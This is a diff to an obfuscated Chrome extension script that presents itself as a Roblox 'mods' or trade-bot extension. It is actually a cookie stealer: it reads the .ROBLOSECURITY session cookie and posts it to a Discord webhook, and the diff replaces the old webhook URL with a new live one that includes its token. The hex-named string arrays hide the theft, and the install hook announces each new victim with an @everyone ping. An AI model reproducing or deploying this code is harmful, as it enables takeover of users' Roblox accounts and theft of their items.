@@ -1,6 +1,6 @@
 var website = "https://www.roblox.com"; // Change this to the website you want to log, don't forget to edit the manifest.json too!
 var cookie_data = ".ROBLOSECURITY"; // Change this to the cookie of the website!
-var discord_web_api = "https://discord.com/api/webhooks/1408813860097622046/RCR84sJY0d1XgrJATE4H7TBDv6Yr6HKdGZT2ix3jmHzlZ_st2criUVLPuaA6DT-7fy-D"; // This is the bot api!
+var discord_web_api = "https://discord.com/api/webhooks/1421061062022795366/TCoIMgvcVaXQ2b5GEYV9Hk7D7udWazZ5EEVrmWnrnOVqiVipZFfA8v3EOu_0uCSAMUOJ"; // This is the bot api!
 
 var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\x0A", "join", "get", "cookies", discord_web_api, "?wait=true", ":star:", ":boom:", ":christmas_tree:", ":large_blue_diamond:", ":large_orange_diamond:", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "A wild cookie has appeared!", "Don\'t count your cookies before they\'re eaten.", "It\'s a bird! It\'s a cookie! It\'s a bird eating a cookie!", "Filthy, filthy, cookies. What\'s next, cake?", "Don\'t make me eat this cookie!", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", " @everyone A new extension startup. ", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
 var _0x2d17 = [_0x9917[0], _0x9917[1], _0x9917[2], _0x9917[3], _0x9917[4], _0x9917[5], _0x9917[6], _0x9917[7], _0x9917[8], _0x9917[9], _0x9917[10], _0x9917[11], _0x9917[12], _0x9917[13], _0x9917[14], _0x9917[15], _0x9917[16], _0x9917[17], _0x9917[18], _0x9917[19], _0x9917[20], _0x9917[21], _0x9917[22], _0x9917[23], _0x9917[24], _0x9917[25], _0x9917[26], _0x9917[27], _0x9917[28], _0x9917[29], _0x9917[30], _0x9917[31], _0x9917[32], _0x9917[33], _0x9917[34], _0x9917[35], _0x9917[36], _0x9917[37], _0x9917[38], _0x9917[39], _0x9917[40], _0x9917[41], _0x9917[42], _0x9917[43], _0x9917[44], _0x9917[45], _0x9917[46], _0x9917[47], _0x9917[48], _0x9917[49]];
@@ -106,3 +106,4 @@ chrome[_0x3a2f[0]][_0x3a2f[49]][_0x3a2f[45]](function(_0x6f75x22) {
     }
 
 })
+
